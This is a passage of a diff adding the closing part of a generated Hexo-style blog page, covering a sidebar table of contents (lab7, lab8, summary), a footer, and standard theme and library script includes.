nav-level-2"><a class="nav-link" href="#lab7"><span class="nav-number">4.3.</span> <span class="nav-text">lab7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab8"><span class="nav-number">4.4.</span> <span class="nav-text">lab8</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">scareing</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+       <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+       <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+       <script type="text/javascript" src="/js/src/fireworks.js"></script>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
